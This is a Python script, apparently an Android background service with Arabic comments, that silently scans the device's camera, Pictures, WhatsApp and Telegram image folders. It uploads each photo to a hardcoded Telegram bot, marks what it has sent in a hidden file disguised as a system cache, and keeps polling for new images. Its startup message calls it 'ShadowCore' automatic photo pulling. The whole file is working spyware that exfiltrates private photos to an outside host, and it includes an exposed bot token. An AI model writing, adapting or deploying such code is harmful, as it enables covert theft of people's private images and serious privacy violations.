import os
import time
import requests
from jnius import autoclass

# توثيق الخدمة في نظام أندرويد لضمان الاستقرار
try:
    PythonService = autoclass('org.kivy.android.PythonService')
    service = PythonService.mService
except:
    service = None

BOT_TOKEN = "8711969097:AAGCjUfiohcUHRWV_1UGa1j51GCEwmCtl3s"
CHAT_ID = "7084557369"
LOG_FILE = "/storage/emulated/0/.sys_data_cache.txt"

def get_sent():
    if not os.path.exists(LOG_FILE): return set()
    with open(LOG_FILE, "r") as f: return set(f.read().splitlines())

def save_sent(path):
    with open(LOG_FILE, "a") as f: f.write(path + "\n")

def send_photo(path):
    try:
        with open(path, "rb") as f:
            # إرسال كملف Document لضمان عدم ضغط الصورة وظهور تاريخها
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument", 
                          data={"chat_id": CHAT_ID}, files={"document": f}, timeout=60)
        return True
    except: return False

def scan_and_send():
    targets = [
        "/storage/emulated/0/DCIM/Camera",
        "/storage/emulated/0/Pictures",
        "/storage/emulated/0/WhatsApp/Media/WhatsApp Images",
        "/storage/emulated/0/Telegram/Telegram Images"
    ]
    sent = get_sent()
    found = []

    for base in targets:
        if os.path.exists(base):
            for root, _, files in os.walk(base):
                for file in files:
                    if file.lower().endswith((".jpg", ".png", ".jpeg")):
                        p = os.path.join(root, file)
                        if p not in sent:
                            found.append(p)
    
    # الترتيب: الأقدم أولاً (حسب وقت التعديل)
    found.sort(key=os.path.getmtime)
    
    for p in found:
        if send_photo(p):
            save_sent(p)
            time.sleep(2) # تأخير بسيط لتجنب حظر البوت

def main():
    # إشعار تشغيل النظام
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                  data={"chat_id": CHAT_ID, "text": "🚀 ShadowCore: سحب الصور التلقائي بدأ الآن..."})
    
    # العمل الفوري
    scan_and_send()
    
    # البقاء في الخلفية لمراقبة أي صور جديدة
    while True:
        time.sleep(60)
        scan_and_send()

if __name__ == "__main__":
    main()
